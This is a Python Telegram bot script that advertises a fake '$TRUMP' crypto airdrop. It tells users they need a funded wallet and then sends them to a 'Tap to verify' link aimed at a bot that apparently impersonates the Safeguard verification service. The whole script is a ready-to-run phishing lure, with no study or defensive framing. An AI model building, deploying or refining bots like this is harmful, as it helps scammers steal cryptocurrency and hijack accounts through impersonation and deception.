import asyncio
import httpx
import requests
from telethon import TelegramClient, events
from telethon.tl.custom import Button
import aiohttp  # Asynchronous HTTP requests
from dotenv import load_dotenv
import os
from aiohttp import web  # For the HTTP server
from io import BytesIO

# Load environment variables from the .env file
load_dotenv()

# Access the environment variables
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('GROUP_BOT_TOKEN')

bot_client = TelegramClient('group_bot', api_id, api_hash).start(bot_token=bot_token)

# Image URLs
bot_client_image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2Fphoto_2025-01-19_17-42-36.jpg?alt=media&token=17b24ddd-81ab-4bc6-89f7-6cbc75803d7a'
verify_bot_image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'


@bot_client.on(events.NewMessage(pattern='/start'))
async def on_start(event):
    try:
        # Set the current airdrop name as a variable
        airdrop_name = "$TRUMP"  # You can change this value dynamically if needed
        
        # Send the initial message
        await event.respond("Searching for available pre-sales and airdrops...")
        await asyncio.sleep(2)
        await event.respond("Airdrops Found ✅")

        # Download the bot client-specific image
        async with aiohttp.ClientSession() as session:
            async with session.get(bot_client_image_url) as response:
                if response.status == 200:
                    from io import BytesIO
                    image_data = BytesIO(await response.read())
                    image_data.name = 'image_drop.jpg'

                    # Send message with the image
                    await event.respond(
                        file=image_data,
                        message=(
                            f"Current Airdrop: {airdrop_name}.\n\n"
                            "Eligibility Requirements:\n\n"
                            "- **Active Trading Wallet:** Your trading wallet must have been active within the last 30 days.\n\n"
                            "- **Verification:** Complete verification via Safeguard.\n\n"
                            "- **Gas fees:** Your wallet must have sufficient funds to cover gas fees.\n\n"
                            "**Note:**\n"
                            "Failure to meet any of the above requirements will result in disqualification."
                        ),
                        buttons=[
                            [Button.inline(f"CLAIM {airdrop_name}", b'verify_button')],
                            [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]
                        ]
                    )
                else:
                    print("Failed to fetch the image.")
    except Exception as e:
        await event.respond("Error: There was an issue verifying your account. Please try again.")



@bot_client.on(events.CallbackQuery(data=b'verify_button'))
async def on_verify_button_click(event):
    try:
        # Download the portal bot-specific image
        async with aiohttp.ClientSession() as session:
            async with session.get(verify_bot_image_url) as response:
                if response.status == 200:
                    from io import BytesIO
                    image_data = BytesIO(await response.read())
                    image_data.name = 'image_verify.jpg'

                    # Send verification message
                    await event.respond(
                        file=image_data,
                        message=(
                            "$TRUMP | PORTAL is being protected by @Safeguard\n\n"
                            "Click below to verify you're human"
                        ),
                        buttons=[
                            [Button.url("Tap to verify", "https://t.me/verification_with_safeguardbot")]
                        ]
                    )
                else:
                    print("Failed to fetch the image.")
    except Exception as e:
        await event.respond("Error: Unable to process your request.")





# HTTP Server for health checks
async def health_check(request):
    return web.Response(text="Bot is running!")


async def run_http_server():
    app = web.Application()
    app.router.add_get('/health', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 5002)
    await site.start()


# Main function to run both the bot and the HTTP server
async def main():
    await bot_client.start()
    print("Bot is running...")
    asyncio.create_task(run_http_server())
    await bot_client.run_until_disconnected()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
